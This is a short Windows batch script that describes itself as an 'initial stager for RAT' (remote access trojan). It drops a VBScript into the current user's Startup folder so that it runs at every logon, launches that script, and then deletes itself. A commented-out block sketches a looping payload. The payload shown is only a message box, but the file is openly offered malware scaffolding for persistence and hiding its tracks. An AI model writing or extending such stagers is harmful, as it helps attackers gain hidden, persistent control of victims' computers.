@echo off

@REM initial stager for RAT

@REM Variables
set "STARTUP_PATH=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
set "INITIAL_PATH=%cd%"
set "THIS_FILE_NAME=initial.cmd"

@REM change the dir
cd %STARTUP_PATH%

@REM write pyloads to startup
(
    echo MsgBox "Line 1" ^& vbCrlf ^& "lin 2", 262192, "Title"
)> popus.vbs

@REM run a payload
WScript "%STARTUP_PATH%"\popus.vbs

@REM go back and delete ourselves
cd %INITIAL_PATH%
del %THIS_FILE_NAME%

@REM (
@REM     echo @echo off
@REM     echo :loop
@REM     echo start /min cmd /c "popup.vbs"
@REM     echo goto loop
@REM ) > payload.cmd
